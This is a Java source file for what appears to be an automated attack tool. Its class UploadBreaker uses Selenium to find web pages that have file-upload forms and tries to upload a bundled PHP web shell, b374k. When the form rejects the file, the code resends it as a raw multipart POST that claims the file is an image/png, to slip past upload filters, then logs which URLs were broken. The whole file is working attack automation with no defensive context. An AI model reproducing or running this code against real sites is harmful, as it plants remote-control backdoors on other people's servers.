package com.george.tailor.breaker;

import java.io.File;
import java.io.InputStream;
import java.io.StringWriter;
import java.net.URL;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.HttpClients;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;

public class UploadBreaker {

	public static Boolean checkEligibility(String url, WebDriver driver){
		Boolean submit = false;
		Boolean file = false;
		
		driver.get(url);
		List<WebElement> webElements = driver.findElements(By.tagName("input"));
		for(WebElement element : webElements){
			String type = element.getAttribute("type");
			if("submit".equals(type)){
				submit = true;
			}
			if("file".equals(type)){
				file = true;
			}
		}
		if(submit && file)
			return true;
		return false;
	}
	
	public void uploadBreakTry(String url, WebDriver driver){
		driver.get(url);
		WebElement fileWebElement = null;
		WebElement submitWebElement = null;
		List<WebElement> webElements = driver.findElements(By.tagName("input"));
		for(WebElement element : webElements){
			String type = element.getAttribute("type");
			if("submit".equals(type)){
				submitWebElement = element;
			}
			if("file".equals(type)){
				fileWebElement = element;
			}
		}
		tryUpload(fileWebElement, submitWebElement, driver);
	}
	
	public void tryUpload(WebElement file, WebElement submit, WebDriver driver){
		URL url = getClass().getResource("b374k-2.2.php");
		File script = new File(url.getPath());
		//File script = new File("\\com\\george\\tailor\\resources\\b374k-2.2.php");
		String responseText = "";
		try{
			file.sendKeys(script.getAbsolutePath());
			submit.click();
			
			WebElement response = driver.findElement(By.className("alert-box"));
			responseText = response.getText();
			if(!responseText.contains("succesful")){
				List<WebElement> webElements = driver.findElements(By.tagName("input"));
				for(WebElement element : webElements){
					String type = element.getAttribute("type");
					if("file".equals(type)){
						file = element;
					}
					if("submit".equals(type)){
						submit = element;
					}
				}
				responseText = tryPostingFile(script, driver, file.getAttribute("name"), submit.getAttribute("name"), submit.getAttribute("value"));
			} 			
		} catch(Exception e){
			System.out.println(e.getMessage());
			e.printStackTrace();
		} finally {
			nextStep(driver, responseText);
		}		
	}
	
	public void nextStep(WebDriver driver, String responseText){
		if(responseText.contains("succesful")){
			System.out.println("SUCCESS to break upload at " + driver.getCurrentUrl());
		} else {
			System.out.println("FAILED to break upload at " + driver.getCurrentUrl());
		}
	}
	
	public String tryPostingFile(File script, WebDriver driver, String fileFormName, String submitFormName, String submitFormValue){
		String responseString = "";
		try{
			String boundary = "---------------"+UUID.randomUUID().toString();
			HttpClient httpclient = HttpClients.createDefault();
			HttpPost httppost = new HttpPost(driver.getCurrentUrl());
		    
		    HttpEntity httpEntity = MultipartEntityBuilder.create()
		    	    .addBinaryBody(fileFormName, script, ContentType.create("image/png"), script.getName())
		    	    .setBoundary(boundary)
		    	    .addTextBody(submitFormName, submitFormValue)
		    	    .build();
			
			httppost.setEntity(httpEntity);
	
			//Execute and get the response.
			HttpResponse response = httpclient.execute(httppost);
			HttpEntity entity = response.getEntity();

			if (entity != null) {
			    InputStream instream = entity.getContent();
			    try {
			    	StringWriter writer = new StringWriter();
			    	IOUtils.copy(instream, writer, "UTF-8");
			    	responseString = writer.toString();
			    } finally {
			        instream.close();
			    }
			}
		} catch (Exception e){
			e.printStackTrace();
		}
		if(responseString.contains("succesful")){
			responseString = "succesful";
		} else {
			WebElement response = driver.findElement(By.className("alert-box"));
			responseString = response.getText();
		}
		return responseString;
	}
}
